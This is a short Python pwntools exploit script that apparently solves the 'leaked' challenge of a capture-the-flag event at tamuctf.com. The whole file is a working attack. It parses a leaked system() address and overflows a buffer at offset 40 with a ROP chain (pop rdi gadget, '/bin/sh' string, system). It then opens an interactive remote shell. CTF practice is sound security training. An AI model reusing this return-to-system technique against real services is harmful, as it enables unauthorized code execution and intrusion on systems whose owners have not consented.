#!/usr/bin/env python3

from pwn import *
import re

exe = ELF("leaked")
rop = ROP(exe)

context.binary = exe
context.terminal = "kitty"

CHAL = "leaked"

p = remote("tamuctf.com", 443, ssl=True, sni=CHAL)

system_addr = int(re.search("(0x[0-9a-fA-F]+)", p.recvline().decode()).group(1), 16)
log.info(f"system addr: {hex(system_addr)}")
payload = flat({
    40: [
        p64((rop.find_gadget(['pop rdi', 'ret']))[0]),
        p64(next(exe.search(b'/bin/sh'))),
        p64(system_addr),
    ]

})
p.sendline(payload)
p.sendline(b"")

p.interactive()
